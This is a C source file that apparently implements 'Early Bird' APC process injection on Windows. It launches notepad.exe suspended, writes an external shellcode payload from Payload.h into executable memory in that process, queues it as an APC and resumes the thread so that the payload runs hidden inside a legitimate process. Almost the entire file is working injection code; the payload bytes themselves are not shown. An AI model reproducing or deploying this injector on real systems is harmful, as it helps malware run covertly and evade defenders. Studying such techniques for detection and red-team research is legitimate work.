#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "Payload.h"

int main( void ) {

    STARTUPINFOA si = { 0 };
    si.cb = sizeof( STARTUPINFOA );

    PROCESS_INFORMATION pi = { 0 };

    if ( !CreateProcessA( NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) ) {
        fprintf( stderr, "[-] CreateProcessA failed with error code %d\n", GetLastError() );
        return 1;
    }

    LPVOID pRemoteBuffer = VirtualAllocEx( pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );

    if ( pRemoteBuffer == NULL ) {
        fprintf( stderr, "[-] VirtualAllocEx failed with error code %d\n", GetLastError() );
        return 1;
    }

    printf( "[+] Allocated %ld bytes at %pd\n", payloadSize, pRemoteBuffer );

    SIZE_T bytesWritten = 0;
    if ( !WriteProcessMemory( pi.hProcess, pRemoteBuffer, payload, payloadSize, &bytesWritten ) ) {
        fprintf( stderr, "[-] WriteProcessMemory failed with error code %d\n", GetLastError() );
        return 1;
    }

    printf( "[+] Wrote %lld bytes to %pd\n", bytesWritten, pRemoteBuffer );

    DWORD oldProtect = 0;
    if ( !VirtualProtectEx( pi.hProcess, pRemoteBuffer, payloadSize, PAGE_EXECUTE_READ, &oldProtect ) ) {
        fprintf( stderr, "[-] VirtualProtectEx failed with error code %d\n", GetLastError() );
        return 1;
    }

    QueueUserAPC( ( PAPCFUNC )pRemoteBuffer, pi.hThread, NULL );

    ResumeThread( pi.hThread );

    printf( "[+] Early Bird APC Injection Successful\n" );

    Sleep( 1000 );

    CloseHandle( pi.hThread );
    CloseHandle( pi.hProcess );

    return 0;

}
